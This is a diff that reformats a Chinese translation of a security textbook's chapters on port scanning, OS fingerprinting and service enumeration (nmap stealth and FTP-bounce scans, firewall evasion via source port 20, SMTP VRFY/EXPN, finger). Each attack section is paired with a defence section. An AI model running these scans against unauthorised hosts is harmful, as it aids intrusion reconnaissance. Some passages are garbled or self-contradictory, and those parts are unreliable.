 可以使用名为 `traceroute` 的命令行工具来执行路由追踪：
 
 ```
@@ -1532,18 +1694,15 @@ traceroute to 10.0.0.1 (10.0.0.1), 30 hops max, 38 bytes packets
 
 `traceroute` 工具默认发送 UDP 数据包，但在带有 `-I` 选项运行时，可以使其使用 ICMP 数据包。
 
-某些网关和防火墙被配置为丢弃 UDP 和 ICMP 数据包，和或丢弃传出的“ICMP Time to Live Exceeded”包。这将 `traceroute` 跳过此类网关和防火墙。有时，防火墙被配置为允许源端口为 20 (FTP) 或 53 (DNS) 的包`traceroute` 中的 `-p` 选项用于设置输出 UDP 数据包的源端口，以便利用此类防火墙规则。
+某些网关和防火墙被配置为丢弃 UDP 和 ICMP 数据包，和或丢弃传出的“ICMP Time to Live Exceeded”包。这将 `traceroute` 跳过此类网关和防火墙。有时，防火墙被配置为允许源端口为 20 (FTP) 或 53 (DNS) 的包 `traceroute` 中的 `-p` 选项用于设置输出 UDP 数据包的源端口，以便利用此类防火墙规则。
 
 ## 防止入站路由追踪
+
 可以采取以下措施防止入站路由追踪：
 
 - 配置防火墙丢弃入站 ICMP 包。
 - 配置防火墙丢弃传出的“ICMP Time to Live Exceeded”包。
 - 配置防火墙允许源端口为 20 (FTP) 或 53 (DNS) 的包。
-
-
-
-
 
 ## 端口扫描
 
@@ -1557,9 +1716,9 @@ traceroute to 10.0.0.1 (10.0.0.1), 30 hops max, 38 bytes packets
 
 由于由于 TCP-connect 扫描完成了三次握手，因此监听目标端口的应用程序将对连接尝试做出响应。这将导致应用程序记录连接尝试。因此，这种端口扫描方法是不隐蔽的。
 
-####### 使用 nmap 执行 TCP-Connect 端口扫描
+#### 使用 nmap 执行 TCP-Connect 端口扫描
 
-在 nmap 中使用 -sT 选项将执行 TCP-connect 扫描：
+在 `nmap` 中使用 `-sT` 选项将执行 TCP-connect 扫描：
 
 ```
 [bash] nmap -sT 10.0.0.1
@@ -1577,14 +1736,15 @@ Port    State   Service
 nmap run completed -- 1 IP address (1 host up) scanned in 0 seconds
 ```
 
-> TCP 和 UDP 端口范围从 1 到 65535。默认情况下，nmap 扫描常用端口。扫描所有 65,535 个端口非常耗时，但可以使用 nmap 使用 -p 标志来实现：
-nmap -sT 192.168.1.1 -p 1-65535
+> TCP 和 UDP 端口范围从 1 到 65535。默认情况下，`nmap` 扫描常用端口。扫描所有 65,535 个端口非常耗时，但可以使用 `nmap` 使用 `-p` 标志来实现：
+
+`nmap -sT 192.168.1.1 -p 1-65535`
 
 ### FTP Bounce 扫描
 
 由于 FTP 协议的设计，当 FTP 客户端使用“活动”模式请求数据传输时，FTP 服务器必须向 FTP 客户端发起连接。FTP 客户端发出 `PORT` 命令，并将 IP 地址和监听端口号作为参数。如果 FTP 客户端发出带有另一个主机 IP 地址的 `PORT` 命令，FTP 服务器将尝试连接到该主机。因此，FTP 协议的这一特性可以用于代理扫描。
 
-nmap 命令包含一个 -b 标志来执行“FTP bounce”扫描：
+`nmap` 命令包含一个 `-b` 标志来执行“FTP bounce”扫描：
 
 ```
 nmap -b username:password@ftp.somecompanyexample.com:21 -p 4000-8080 target.somecompanyexample.com
@@ -1596,9 +1756,11 @@ nmap -b username:password@ftp.somecompanyexample.com:21 -p 4000-8080 target.some
 
 这种类型的扫描会导致扫描器向目标主机发送 SYN 数据包。如果目标主机在特定端口上监听，它将用 SYN+ACK 响应。如果主机存活，将收到 RST 数据包。由于这种扫描方法没有完成 TCP 三次握手，因此它是隐蔽的；因为它不会被目标主机记录。
 
-####### SYN 扫描
+#### SYN 扫描
 
-在 nmap 中使用 -sS 标志将执行 SYN 扫描：
+在 `nmap` 中使用 `-sS` 标志将执行 SYN 扫描：
+
+
 
 ```
 [bash]# nmap -sS 192.168.1.150
@@ -1616,7 +1778,7 @@ Nmap run completed -- 1 IP address (1 host up) scanned in 2 seconds
 
 ## 源端口扫描
 
-由于 FTP 协议的设计，当 FTP 客户端使用活动模式请求数据传输时，FTP 服务器必须向 FTP 客户端发起连接。为了方便这种操作，许多防火墙被配置为允许所有源端口设置为 20 的入站 IP 包。此外，来自 DNS 服务器的 IP 包其源端口设置为 53，因此许多防火墙允许所有源端口为 53 的入站数据包。可以使用 -g 关指示 nmap 将其数据包的源端口设置为常量：
+由于 FTP 协议的设计，当 FTP 客户端使用活动模式请求数据传输时，FTP 服务器必须向 FTP 客户端发起连接。为了方便这种操作，许多防火墙被配置为允许所有源端口设置为 20 的入站 IP 包。此外，来自 DNS 服务器的 IP 包其源端口设置为 53，因此许多防火墙允许所有源端口为 53 的入站数据包。可以使用 `-g` 关指示 `nmap` 将其数据包的源端口设置为常量：
 
 ```
 nmap -SS -g 20 192.168.1.1
@@ -1628,25 +1790,34 @@ nmap -SS -g 20 192.168.1.1
 
 > FIN IP 包用于拆已建立的 TCP 连接。
 
-####### FIN 扫描
+#### FIN 扫描
 
-在 nmap 中使用 -sF 标志将执行 FIN 扫描：
+在 `nmap` 中使用 `-sF` 标志将执行 FIN 扫描：
 
 ```
 [bash]# nmap -sF 192.168.1.100
 ```
 
 Starting nmap V.3.00 ( www.insecure.org/nmap/ )
+
 Interesting ports on (192.168.1.100):
+
 (The 1594 ports scanned but not shown below are in state: closed)
 
 | Port State Service |
+
 | 21/tcp open ftp |
+
 | 22/tcp open ssh |
+
 | 25/tcp open smtp |
+
 | 53/tcp open domain |
+
 | 80/tcp open http |
+
 | 110/tcp open pop-3 |
+
 | 113/tcp open auth |
 
 Nmap run completed -- 1 IP address (1 host up) scanned in 43 seconds
@@ -1655,19 +1826,22 @@ Nmap run completed -- 1 IP address (1 host up) scanned in 43 seconds
 
 Ident（识别协议）服务器在端口 113 上监听连接。如果到运行 ident 服务器的主机上某个监听的端口建立了 TCP 连接，则可以查询 ident 服务器获取与连接相关的进程的权限级别。
 
-####### 反向 Ident 扫描
+#### 反向 Ident 扫描
 
-在 nmap 中使用 -I 标志将执行 TCP 反向 ident 扫描：
+在 `nmap` 中使用 `-I` 标志将执行 TCP 反向 ident 扫描：
 
 ```
 [bash]# nmap -I -sT -p 80 192.168.1.100
 ```
 
 Starting nmap V.3.00 ( www.insecure.org/nmap/ )
+
 Interesting ports on (192.168.1.100):
 
 | Port | State |
+
 |---|---|
+
 | 80/tcp | open |
 
 Nmap run completed -- 1 IP address (1 host up) scanned in 1 second
@@ -1676,23 +1850,30 @@ Nmap run completed -- 1 IP address (1 host up) scanned in 1 second
 
 这种扫描方法向目标主机发送带有 FIN、URUSH 和 PUSH 标志的 TCP 包。如果目标主机在特定端口上监听，它将响应 RST 数据包。如果目标主机在特定端口上监听，它将不响应。FIN 包通常用于关闭已建立的 TCP 连接，URG 包表示需要立即处理，PUSH 包表示在会话期间传输数据。
 
-####### XMAS 扫描
+#### XMAS 扫描
 
-在 nmap 中使用 -sX 标志将执行 XMAS 扫描：
+在 `nmap` 中使用 `-sX` 标志将执行 XMAS 扫描：
 
 ```
 [bash]# nmap -sX 192.168.1
 ```
 
 Starting nmap V.3.00 ( www.insecure.org/nmap/ )
+
 Interesting ports on (192.168.1):
+
 (The 1595 ports scanned but not shown below are in state: closed)
 
 | Port | State | Service |
+
 |---|---|---|
+
 | 22/tcp | open | ssh |
+
 | 80/tcp | open | http |
+
 | 113/tcp | open | auth |
+
 | 6000/tcp | open | X11 |
 
 nmap run completed -- 1 IP address (1 host up) scanned in 2 seconds
@@ -1701,26 +1882,36 @@ nmap run completed -- 1 IP address (1 host up) scanned in 2 seconds
 
 这种扫描类型涉及向目标主机发送所有标志关闭的 TCP 包。如果目标主机在特定端口上监听，它将不响应。否则，它将发送 RST 包。
 
-####### NULL 扫描
+#### NULL 扫描
 
-在 nmap 中使用 -sN 标志将执行 NULL 扫描：
+在 `nmap` 中使用 `-sN` 标志将执行 NULL 扫描：
 
 ```
 [bash]# nmap -sN 192.168.1.100
 ```
 
 Starting nmap V.3.00 ( www.insecure.org/nmap/ )
+
 Interesting ports on (192.168.1.100):
+
 (The 1594 ports scanned but not shown below are in state: closed)
 
 | Port State Service |
+
 |---|---|---|
+
 | 21/tcp open ftp |
+
 | 22/tcp open ssh |
+
 | 25/tcp open smtp |
+
 | 53/tcp open domain |
+
 | 80/tcp open http |
+
 | 110/tcp open pop-3 |
+
 | 113/tcp open auth |
 
 Nmap run completed -- 1 IP address (1 host up) scanned in 43 seconds
@@ -1729,30 +1920,35 @@ Nmap run completed -- 1 IP address (1 host up) scanned in 43 seconds
 
 这种扫描类型用于向开放端口发送 NULL 命令以确定它们是否为 RPC（远程过程调用）端口。一旦确定开放端口是 RPC 端口，将查询并获取绑定到端口的应用程序信息。
 
-####### RPC 扫描
+#### RPC 扫描
 
-在 nmap 中使用 -sR 选项将执行 RPC 扫描：
+在 `nmap` 中使用 `-sR` 选项将执行 RPC 扫描：
 
 ```
 [bash]# nmap -sR 10.0.0.10
 ```
 
 Starting nmap V. 3.00 ( www.insecure.org/nmap/ )
+
 Interesting ports on (10.0.0.10):
+
 (The 1584 ports scanned but not shown below are in state: closed)
 
 | Port | State | Service (RPC) |
+
 | --- |---|---|
+
 | 7/tcp | open | echo |
+
 | 21/tcp | open | ftp |
+
 | 22/tcp | open | ssh |
+
 | 37/tcp | open | time |
+
 | 53/tcp | open | domain |
+
 | 111/tcp | open | sunrpc (rpcbind V2-4) |
-
-
-
-
 
 # 30 第一部分：攻击技术与防御
 
@@ -1776,14 +1972,20 @@ Nmap 运行完成 -- 1 个 IP 地址 (1 个主机在线) 已在 40 秒内完成�
 
 此类扫描的目的是确定目标主机上支持哪些 IP 协议。它会针对特定协议发送原始 IP 数据包，如果接收到 ICMP 协议不可达消息，则目标主机很可能不支持该特定协议。
 
-### IP 协议扫描 - nmap 中的 -sO 标志将执行 IP 协议扫描。
+### IP 协议扫描
+
+`-sO` 标志将执行 IP 协议扫描。
 
 ```bash
 [bash]# nmap -sO 192.168.1.1
 ```
 
-Starting nmap V.3.00 ( www.insecure.org/nmap/ )
+
+
+Starting `nmap` V.3.00 ( www.insecure.org/nmap/ )
+
 (192.168.1.1) 上的感兴趣协议：
+
 已扫描但未在下方列出的 251 个协议状态为：(closed)
 
 | 协议 | 状态名称 |
@@ -1799,7 +2001,7 @@ Starting nmap V.3.00 ( www.insecure.org/nmap/ )
 
 ### ACK 扫描
 
-可以使用 nmap 配合 -sA 标志执行 ACK 扫描。
+可以使用 `nmap` 配合 `-sA` 标志执行 ACK 扫描。
 
 ```
 nmap -sA target_address
@@ -1807,39 +2009,41 @@ nmap -sA target_address
 
 # 第 2 章：扫描与识别 31
 
-# # 窗口 (Window)
+## 窗口 (Window)
 
 此类扫描虽然与 ACK 扫描相似，但由于 TCP 窗口大小报告方式的异常，有时有助于检测某些系统上的开放、已过滤和未过滤的端口。
 
-# ## 窗口扫描 (Window Scans)
+### 窗口扫描 (Window Scans)
 
-潜在的入侵者可以使用 nmap 配合 -sW 标志执行窗口扫描：
+潜在的入侵者可以使用 `nmap` 配合 `-sW` 标志执行窗口扫描：
 
 ```
 nmap -sW target_address
 ```
 
-# ## UDP
+## UDP
 
 为了确定主机是否在特定的 UDP 端口监听，会向该端口发送 UDP 数据包。如果目标主机没有监听该端口，则会接收到 ICMP 端口不可达包。然而，如果目标主机正在监听该端口，则不会接收此类数据包。由于 UDP 不是面向连接的协议，因此 UDP 扫描不可不可的。
 
-# ## UDP 端口扫描
+### UDP 端口扫描
 
-使用 nmap 中的 -sU 选项将执行 UDP 扫描：
+使用 `nmap` 中的 `-sU` 选项将执行 UDP 扫描：
 
 ```bash
 [bash]# nmap -sU 192.168.1.100
 ```
 
-Starting nmap V. 2.54BETA31 ( with insecure.org/nmap/ )
+Starting `nmap` V. 2.54BETA31 ( with insecure.org/nmap/ )
+
 (192.168.1.100) 上的中断端口：
+
 已扫描但未在下方列出的 1454 个端口状态为：(closed)
 
 | 端口 | 状态 | 域 |
 |---|---|---|
 | 53/udp | open | |
 
-# ## 防御端口扫描
+### 防御端口扫描
 
 你可以使用这些方法来应对针对你网络的扫描：
 
@@ -1850,11 +2054,11 @@ Starting nmap V. 2.54BETA31 ( with insecure.org/nmap/ )
 - 配置你的防火墙丢弃或重置到 ident 端口 (113) 的连接尝试。
 - 使用状态检测防火墙。这将防止前文中提到的大多数扫描。
 
-# # 指纹识别 (FINGERPRINTING)
+## 指纹识别 (FINGERPRINTING)
 
 尽管许多系统设计者尽力遵循相关的 RFC，但操作系统内核有时对细节的解释可能不同。Xprobe 和 Nmap 等工具会探测此类差异，以便对目标操作系统进行指纹识别。
 
-# ## 使用 Xprobe 操作系统指纹
+### 使用 Xprobe 操作系统指纹
 
 Xprobe 使用 ICMP 数据包执行指纹识别。结果根据对操作系统最佳猜测分配的分进行排序。该工具具有区分通往路径路径过滤设备的能力，可在 http://www.sys-security.com/html/tools/tools.html。以下是使用 Xprobe 的示例：
 
@@ -1863,52 +2067,89 @@ Xprobe 使用 ICMP 数据包执行指纹识别。结果根据对操作系统最�
 ```
 
 Xprobe v0.1 Copyright (c) 2002 ygrave@tiger.net, ofir@sys-security.com
+
 +] Target is target.someexample.com
+
 +] Loading modules:
+
 +] ICMP echo (ping)
+
 +] ICMP distance
+
 +] ICMP echo
+
 +] ICMP Timestamp
+
 +] ICMP Address
+
 +] ICMP Request
+
 +] Initial engine
+
 +] Running scan
+
 +] Host: 192.168.1.1 is up (Guess probability: 100%)
+
 +] Target: 192.168.1.1 is alive
+
 +] Primary guesses:
+
 +] Host: 192.168.1.1 OS: "Linux Kernel 2.4" (Guess probability: 60%)
+
 +] Other guesses:
+
 +] Host: 192.168.1.1 OS: "Linux Kernel 2.0 - 2.5.20" (Guess probability: 60%)
+
 +] Host: 192.168.1.1 OS: "Linux Kernel 2.2" (Guess probability: 60%)
+
 +] Host: 192.168.1.1 OS: "Microsoft NT 4 Service Pack 4 and Above" (Guess probability: 60%)
+
 +] Host: 192.168.1.1 OS: "BSD 1.2" (Guess probability: 50%)
+
 +] Host: 192.168.1.1 OS: "Microsoft NT 4 Service Pack 3 and Below" (Guess probability: 50%)
+
 +] Host: 192.168.1.1 OS: "Microsoft ME" (Guess probability: 50%)
+
 +] Host: 192.168.1.1 OS: "Windows 2000/2000SP1/2000SP2" (Guess probability: 50%)
+
 +] Host: 192.168.1.1 OS: "Windows XP" (Guess probability: 50%)
+
 +] Host: 192.168.1.1 OS: "FreeBSD 4.5" (Guess probability: 45%)
+
 +] Host: 192.168.1.1 OS: "OS X 10.1" (Guess probability: 40%)
+
 +] Host: 192.168.1.1 OS: "Windows 98/98SE" (Guess probability: 40%)
+
 +] Host: 192.168.1.1 OS: "Digital UNIX 5.6" (Guess probability: 35%)
+
 +] Host: 192.168.1.1 OS: "Sun Solaris 5 (SunOS 2.5)" (Guess probability: 35%)
+
 +] Host: 192.168.1.1 OS: "Sun Solaris 6 (SunOS 2.6)" (Guess probability: 35%)
+
 +] Host: 192.168.1.1 OS: "Sun Solaris 7 (SunOS 2.7)" (Guess probability: 35%)
+
 +] Host: 192.168.1.1 OS: "Sun Solaris 8 (SunOS 2.8)" (Guess probability: 35%)
+
 +] Host: 192.168.1.1 OS: "FreeBSD 3.4"
+
 +] Cleaning up scan
+
 +] Modules deinitialized
+
 +] Execution completed.
 
 ### 使用 nmap 执行操作系统指纹识别
 
-nmap 程序也可以被入侵者配合 -O 标志执行操作系统指纹识别：
+`nmap` 程序也可以被入侵者配合 `-O` 标志执行操作系统指纹识别：
 
 ```bash
 [bash]# nmap -O 192.168.1.1
 ```
 
-Starting nmap V.3.00 ( www.insecure.org/nmap/ )
+Starting `nmap` V.3.00 ( www.insecure.org/nmap/ )
+
 (192.168.1.1) 上的感兴趣端口：
+
 (已扫描但未在下方列出的 1597 个端口状态为: closed)
 
 | 端口 | 状态 | 服务 |
@@ -1918,29 +2159,26 @@ Starting nmap V.3.00 ( www.insecure.org/nmap/ )
 | 113/tcp | open | auth |
 | 6000/tcp | open | X11 |
 
+
+
 远程操作系统猜测为: Linux Kernel 2.4.0 - 2.5.20
+
 Uptime 6.584 days (since Sun Oct 27 10:23:37 2002)
 
 Nmap 运行完成 -- 1 个 IP 地址 (1 个主机在线) 已在 8 秒内完成
 
-### 总结
+## 总结
 
 通过 ping 主机来快速确定它们是否在线。此外，可以使用各种扫描技术来确定在线主机上的开放端口。随后，可以使用操作系统指纹工具来识别目标主机上的操作系统版本。当入侵者遵循了这种方法论后，他或她就可以进入在第 3 章中描述的用户名和服务枚举过程。
 
+# 第3章 枚举
 
-
-
-
-## 第3章
-
-## 枚举
+## 概述
 
 + 本章内容：
 - 枚举远程服务
 - 自动化Banner抓取（Banner-Grabbing）
 - 总结
-
-## 36 第一部分：黑客技术与防御
 
 在对目标主机进行端口扫描后，入侵者将确切知道哪些主机是活跃的以及它们开放了哪些端口。有了这些信息，逻辑上的下一步是从监听特定端口的服务中枚举出各种信息，例如用户名、文件共享和操作系统版本号。只有在获取了此类信息后，攻击者才能像下一章讨论的那样，转向利用特定的漏洞。
 
@@ -1950,9 +2188,9 @@ Nmap 运行完成 -- 1 个 IP 地址 (1 个主机在线) 已在 8 秒内完成
 
 ## 枚举远程服务
 
-以下是已知易受枚举攻击的服务列表。它们按照通常监听的端口号进行排序（请查看你的Unix或Linux主机上的 /etc/services 文件以获取完整列表）。
+以下是已知易受枚举攻击的服务列表。它们按照通常监听的端口号进行排序（请查看你的Unix或Linux主机上的 `/etc/services` 文件以获取完整列表）。
 
-> 此处列出的任何服务都可以配置为监听非标准端口。某些服务使用非ASCII字符进行通信，很难识别。可以使用可用位于 http://www.thehackerschoice.com/releases.php 的 Amap等工具来检测服务：
+> 此处列出的任何服务都可以配置为监听非标准端口。某些服务使用非ASCII字符进行通信，很难识别。可以使用可用位于 `http://www.thehackerschoice.com/releases.php` 的 `Amap` 等工具来检测服务：
 
 ```bash
 $ amap -sT intranet.somecompanyasanexample.com 9934
@@ -1964,7 +2202,7 @@ Unidentified ports: None.
 Amap1.2.1b ended at Sun Mar 9 09:30:59 2003
 ```
 
-在这个示例中，Amap 成功发现主机 `intranet.somecompanyasanexample.com` 在端口 9934 上运行HTTPS。这是一个非常有用的信息，因为HTTPS的标准端口是443。
+在这个示例中，`Amap` 成功发现主机 `intranet.somecompanyasanexample.com` 在端口 9934 上运行HTTPS。这是一个非常有用的信息，因为HTTPS的标准端口是443。
 
 ## 阻塞并停止不必要的服务
 
@@ -1987,7 +2225,7 @@ Connected to 192.168.1.1 (192.168.1.1).
 Name (192.168.1.1:username):
 ```
 
-telnet客户端也可以直接连接到FTP端口以获取横幅信息：
+`telnet` 客户端也可以直接连接到FTP端口以获取横幅信息：
 
 ```bash
 $ telnet 192.168.1.1 21
@@ -1997,7 +2235,7 @@ Connected to 192.168.1.1.
 
 #### 修改FTP服务器Banner
 
-如果你正在运行WU-FTPD服务器，可以编辑 /etc/ftpaccess文件或使用greeting指令来更改服务器横幅。例如：
+如果你正在运行WU-FTPD服务器，可以编辑 `/etc/ftpaccess` 文件或使用 `greeting` 指令来更改服务器横幅。例如：
 
 ```text
 greeting No banner available.
@@ -2005,11 +2243,11 @@ greeting No banner available.
 
 ### SSH（安全外壳）：22 (TCP)
 
-SSH是一种用于交换数据的安全协议。它可以登录远程机器、执行命令并传输文件。由于SSH通信是加密的，它是telnet、rlogin和FTP的可靠替代方案。
+SSH是一种用于交换数据的安全协议。它可以登录远程机器、执行命令并传输文件。由于SSH通信是加密的，它是 `telnet`、`rlogin` 和 `FTP` 的可靠替代方案。
 
 #### 获取SSH服务器Banner
 
-尽管SSH通信是加密的，当使用telnet连接时，SSH守护进程会打印版本信息：
+尽管SSH通信是加密的，当使用 `telnet` 连接时，SSH守护进程会打印版本信息：
 
 ```bash
 $ telnet 192.168.1.1 22
@@ -2019,7 +2257,7 @@ Escape character is '^'.
 SSH-1.99-OpenSSH_3.4p1
 ```
 
-在上面的示例中，Banner显示的版本信息“OpenSSH_3.4p1”可以通过获取并编辑SSH源码来更改。使用grep命令在SSH源码中找到该字符串。一旦更改了该字符串，请重新编译并安装SSH。横幅还显示了协议版本“SSH-1.99”，更改此值可能会某些SSH客户端停止正常工作。
+在上面的示例中，Banner显示的版本信息“OpenSSH_3.4p1”可以通过获取并编辑SSH源码来更改。使用 `grep` 命令在SSH源码中找到该字符串。一旦更改了该字符串，请重新编译并安装SSH。横幅还显示了协议版本“SSH-1.99”，更改此值可能会某些SSH客户端停止正常工作。
 
 ### Telnet：23 (TCP)
 
@@ -2027,7 +2265,7 @@ Telnet是用于登录远程机器的明文协议。
 
 #### 获取Telnet服务器Banner
 
-只需telnet到服务器即可从telnet守护进程获取Banner信息：
+只需 `telnet` 到服务器即可从 `telnet` 守护进程获取Banner信息：
 
 ```bash
 $ telnet 192.168.1.1 23
@@ -2040,7 +2278,7 @@ login:
 
 #### 修改Telnet服务器Banner
 
-为了更改telnet banner，你需要为它编写一个包装器（wrapper）。假设你正在inetd中运行telnetd，编辑你的 /etc/inetd.conf，并将
+为了更改 `telnet` banner，你需要为它编写一个包装器（wrapper）。假设你正在 `inetd` 中运行 `telnetd`，编辑你的 `/etc/inetd.conf`，并将
 
 ```text
 telnet stream tcp nowait root /usr/sbin/in.telnetd in.telnetd
@@ -2052,7 +2290,7 @@ telnet stream tcp nowait root /usr/sbin/in.telnetd in.telnetd
 telnet stream tcp nowait root /usr/sbin/in.telnetdwrapper in.telnetd
 ```
 
-现在，你创建一个包含以下内容的 /usr/sbin/in.telnetdwrapper：
+现在，你创建一个包含以下内容的 `/usr/sbin/in.telnetdwrapper`：
 
 ```sh
 #!/bin/sh
@@ -2060,7 +2298,7 @@ telnet stream tcp nowait root /usr/sbin/in.telnetdwrapper in.telnetd
 exec /usr/sbin/in.telnetd
 ```
 
-> 如果你使用inetd，请适当编辑xinetd.d目录下的telnet文件。必须重启inetd或xinetd才能生效。注意，某些版本的telnetd允许通过编辑 /etc/issue.net文件来更改banner信息。
+> 如果你使用 `inetd`，请适当编辑 `xinetd.d` 目录下的 `telnet` 文件。必须重启 `inetd` 或 `xinetd` 才能生效。注意，某些版本的 `telnetd` 允许通过编辑 `/etc/issue.net` 文件来更改 `banner` 信息。
 
 ### SMTP（简单邮件传输协议）：25 (TCP)
 
@@ -2068,7 +2306,7 @@ SMTP是互联网上用于传输电子邮件的协议。
 
 #### 获取SMTP服务器Banner
 
-通过telnet到运行SMTP的主机的端口25可以获取SMTP进程banner：
+通过 `telnet` 到运行SMTP的主机的端口25可以获取SMTP进程 `banner`：
 
 ```bash
 $ telnet 192.168.1.1 25
@@ -2081,13 +2319,15 @@ Escape character is '^'
 
 #### 修改SMTP服务器Banner
 
-如果你使用Sendmail，可以通过编辑 /etc/sendmail.cf文件并更改SmtpGreeting字段来更改SMTP banner。
+如果你使用 `Sendmail`，可以通过编辑 `/etc/sendmail.cf` 文件并更改 `SmtpGreeting` 字段来更改SMTP `banner`。
 
 #### 使用EXPN和VRFY枚举用户
 
-EXPN和VRFY是SMTP支持的两个允许用户名枚举的命令。EXPN和VRFY可确认特定用户名的存在。EXPN可以用于枚举特定组邮件别名中所有用户的姓名和电子邮件地址。
+`EXPN` 和 `VRFY` 是SMTP支持的两个允许用户名枚举的命令。`EXPN` 和 `VRFY` 可确认特定用户名的存在。`EXPN` 可以用于枚举特定组邮件别名中所有用户的姓名和电子邮件地址。
 
-这里是VRFY的示例：
+这里是 `VRFY` 的示例：
+
+
 
 ```bash
 $ telnet mail.somecompanyexample.com 25
@@ -2100,7 +2340,7 @@ VRFY smith
 250 2.1.5 <smith@sales.somecompanyexample.com>
 ```
 
-这里是使用EXPN的示例：
+这里是使用`EXPN`的示例：
 
 ```bash
 $ telnet mail.somecompanyexample.com 25
@@ -2113,32 +2353,33 @@ EXPN marketing-team
 250-2.1.5 <bob@marketing.somecompanyexample.com>
 ```
 
-
-
-
-
 # 第 3 章：枚举 Enumeration 41
 
 250-2.1.5 <alan@marketing.somecompanyanasexample.com>
+
 250-2.1.5 <joe@marketing.somecompanyanasexample.com>
+
 250-2.1.5 <dilip@marketing.somecompanyanasexample.com>
+
 250-2.1.5 <john@legal.somecompanyanasexample.com>
+
 250-2.1.5 <kavita@sales.somecompanyanasexample.com>
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_95_0.png)
 
 ### 关闭 EXPN 和 VRFY
 
-配置你的 SMTP 服务器使其不支持 EXPN 和 VRFY。在 Sendmail 中，编辑 `/etc/sendmail.cf` 并将 `PrivacyOptions` 设置为 `authwarnings, noexpn, novrfy`。
+配置你的 SMTP 服务器使其不支持 `EXPN` 和 `VRFY`。在 Sendmail 中，编辑 `/etc/sendmail.cf` 并将 `PrivacyOptions` 设置为 `authwarnings, noexpn, novrfy`。
 
 ### DNS (域名命名系统): 53 (TCP/UDP)
 
-DNS 是一种用于在域名和 IP 地址之间进行转换的协议。
+`DNS` 是一种用于在域名和 IP 地址之间进行转换的协议。
 
 #### 获取 BIND 版本信息
 
-Linux 上广泛使用的 DNS 服务器软件是 BIND (伯克利互联网命名域)。可以使用 `dig` 工具查询特定宿主机上运行的 BIND 版本。
-例如，如果运行 BIND 的宿主机 IP 地址为 `192.168.1.1`：
+Linux 上广泛使用的 DNS 服务器软件是 `BIND` (伯克利互联网命名域)。可以使用 `dig` 工具查询特定宿主机上运行的 `BIND` 版本。
+
+例如，如果运行 `BIND` 的宿主机 IP 地址为 `192.168.1.1`：
 
 ```bash
 [bash] dig -t txt -c chaos VERSION.BIND @192.168.1.1
@@ -2165,7 +2406,7 @@ VERSION.BIND.	CH	TXT	"8.3.3-REL"
 
 #### 配置 BIND 不显示版本信息
 
-编辑 BIND 配置文件 `named.conf` 并覆盖版本号：
+编辑 `BIND` 配置文件 `named.conf` 并覆盖版本号：
 
 ```
 options {
@@ -2173,11 +2414,11 @@ options {
 }
 ```
 
-你可能还想为 BIND 配置特定的 ACL，并限制来自特定宿主机的查询。详细信息请参阅 BIND 文档。关于 BIND 的更多信息可以在 http://www.isc.org/products/BIND 处找到。
+你可能还想为 `BIND` 配置特定的 `ACL`，并限制来自特定宿主机的查询。详细信息请参阅 `BIND` 文档。关于 `BIND` 的更多信息可以在 http://www.isc.org/products/BIND 处找到。
 
 ### Finger: 79 (TCP)
 
-Finger 是一个用户信息查询程序。对远程主机进行指纹查询（Fingering）可以提供诸如用户名、IP 地址、空闲时间以及此时登录到宿主机上的个人真实姓名。
+`Finger` 是一个用户信息查询程序。对远程主机进行指纹查询（Fingering）可以提供诸如用户名、IP 地址、空闲时间以及此时登录到宿主机上的个人真实姓名。
 
 #### 使用 Finger 命令枚举远程用户
 
@@ -2197,7 +2438,7 @@ rob Robert Smith pts/4 51 Wed 14:36 dhcp.rhomeisp.org
 tang Tang pts/3 1:08 Wed 10:07 somecaseanexample.com
 ```
 
-也可以对特定的用户名进行 finger 查询。查询特定用户名即使在该用户此时未登录，也会产生关于该用户的信息：
+也可以对特定的用户名进行 `finger` 查询。查询特定用户名即使在该用户此时未登录，也会产生关于该用户的信息：
 
 ```bash
 finger username@host
@@ -2215,7 +2456,9 @@ Last login Jan 11 14:26:51 on tty2
 # 第 3 章：枚举 Enumeration 43
 
 新邮件于 2003 年 1 月 15 日周三 14:36:29 接收；
+
 自 2003 年 1 月 11 日周三 14:29:54 以来未读
+
 无计划。
 
 已知旧版本的 Solaris `finger` (`finger` 守护进程）包含一个漏洞，使用类似 `a b c d e f g h` 的字符串进行查询时，会暴露宿主机上所有的用户名列表：
@@ -2228,20 +2471,21 @@ finger a b c d e f g h@host
 
 ### 禁用 Finger
 
-如果你正在运行 finger 服务器，强烈建议考虑以下建议：
+如果你正在运行 `finger` 服务器，强烈建议考虑以下建议：
 
-- 如果可能，请考虑禁用 finger 服务。它向本地用户和入侵者提供了过多的系统信息。如果你使用 `inetd`，可以通过注释掉 `/etc/inetd.conf` 中的相应行来禁用 finger。如果你使用 `xinetd`，请编辑 `inetd.d` 目录下的文件，并确保以下行存在：
+- 如果可能，请考虑禁用 `finger` 服务。它向本地用户和入侵者提供了过多的系统信息。如果你使用 `inetd`，可以通过注释掉 `/etc/inetd.conf` 中的相应行来禁用 `finger`。如果你使用 `xinetd`，请编辑 `inetd.d` 目录下的文件，并确保以下行存在：
+
 `disable = yes`
 
-- 你必须重启 `inetd` 或 `inetd` 才能使更改生效。如果你必须运行 finger 服务器，请配置你的防火墙丢弃入站连接。
+- 你必须重启 `inetd` 或 `inetd` 才能使更改生效。如果你必须运行 `finger` 服务器，请配置你的防火墙丢弃入站连接。
 
 ### HTTP (超文本传输协议): 80 (TCP)
 
-HTTP 是一种用于传输 Web 内容的协议。
+`HTTP` 是一种用于传输 Web 内容的协议。
 
 #### 获取 HTTP 服务器 Banner
 
-通过查询远程宿主机来获取 HTTP 服务器 Banner：
+通过查询远程宿主机来获取 `HTTP` 服务器 Banner：
 
 ```bash
 curl -I http://host
@@ -2254,22 +2498,27 @@ HTTP/1.1 200 OK
 Server: Apache/2.4.41 (Ubuntu)
 ```
 
-
-
-
-
 # 第3章：枚举 47
 
 | 100004 | 1 | tcp | 762 | ypserv |
+
 | 100004 | 2 | tcp | 51059 | ypserv |
+
 | 100007 | 3 | udp | 56186 | ybind |
+
 | 100007 | 2 | udp | 56186 | ybind |
+
 | 100007 | 1 | udp | 56186 | ybind |
+
 | 100003 | 3 | tcp | 51390 | ybind |
+
 | 100002 | 2 | tcp | 51390 | ybind |
+
 | 100001 | 1 | tcp | 51390 | ybind |
 
-rpc.usersd 和 rpc.whod 是 RPC 服务，提供与 finger 类似的用户信息：
+`rpc.usersd` 和 `rpc.whod` 是 `RPC` 服务，提供与 `finger` 类似的用户信息：
+
+
 
 ```bash
 [bash]$ rusers -l 192.168.1.1
@@ -2288,11 +2537,11 @@ joe 192.168.1.11:pts/1 Jan 12 14:33
